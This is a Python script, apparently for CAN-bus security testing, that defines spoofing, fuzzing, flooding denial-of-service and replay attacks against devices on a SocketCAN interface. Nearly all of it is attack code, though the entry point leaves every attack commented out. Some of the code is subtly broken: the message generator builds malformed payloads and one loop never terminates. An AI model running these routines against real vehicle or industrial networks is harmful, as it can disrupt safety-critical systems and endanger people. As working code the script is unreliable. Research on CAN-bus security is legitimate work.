import can, subprocess, time, random


def network_maintenance():
    result = subprocess.run(['ip', 'link', 'show', 'can0'], capture_output=True, text=True)
    output = result.stdout
    
    if 'LOWER_UP' not in output:
        subprocess.run(['sudo', 'ip', 'link', 'set', 'can0', 'down'])
        subprocess.run(['sudo', 'ip', 'link', 'set', 'can0', 'up', 'type', 'can', 'bitrate', '500000'])
                
def get_sample():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:      
        msgs, timer = [], 2000
        for msg in bus:
            msgs += [msg]

            if timer <= 0:
                break
            timer -= 150
        return msgs

def generate_message():
    msg = [0x1] + [random.randint(0, 255) for _ in range(random.randint(0, 6))]
    msg.append((len(msg) - 8) * [0x0])
    return msg

def send_many(id_target, message, sending_duration=float('inf')):
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:
        while sending_duration > 0:
            try:
                msg = can.Message(arbitration_id=id_target, data=message, is_extended_id=False)
                bus.send(msg)
                time.sleep(0.0001)

                network_maintenance()

            except can.CanError:
                bus.flush_tx_buffer()

            sending_duration -= 150


def spoofing_attack():
    sample = get_sample()
    sample.sort(key=lambda msg: msg.arbitration_id)

    id_target = sample[0].arbitration_id
    message = [0x1, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]
    
    send_many(id_target, message)

def fuzzy_attack():
    while True:
        timer = 5000
        while timer > 0:
            id_target = random.randint(0, 32)
            
            for _ in range(5):
                message = generate_message()
                send_many(id_target, message, 1000)
        
        timer -= 150

def DoS_attack():
    send_many(0, [0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0])


def replay_attack():
    while True:
        
        timer = 5000
        while timer > 0:
            sample = get_sample()
            sample = set(sample)

            for msg in sample:
                send_many(msg.arbitration_id, msg.data, 10000)
            
            timer -= 150


if __name__ == "__main__":
    #fuzzy_attack()
    #spoofing_attack()
    #DoS_attack()
    #replay_attack()
    pass